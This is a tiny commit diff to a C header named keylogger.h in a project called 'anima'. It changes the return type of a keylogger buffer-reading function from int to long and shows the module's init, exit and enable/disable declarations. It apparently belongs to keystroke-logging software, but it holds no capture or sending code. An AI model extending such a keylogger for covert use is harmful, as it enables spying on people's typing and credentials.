Update keylogger API.

+++ include/anima/keylogger.h
@@ -93,7 +93,7 @@
 #define ENABLE  'e'
 #define DISABLE 'd'
 
-int keylogger_buffer_get(char *, unsigned int);
+long keylogger_buffer_get(char *, unsigned int);
 int keylogger_init(void);
 int keylogger_exit(void);
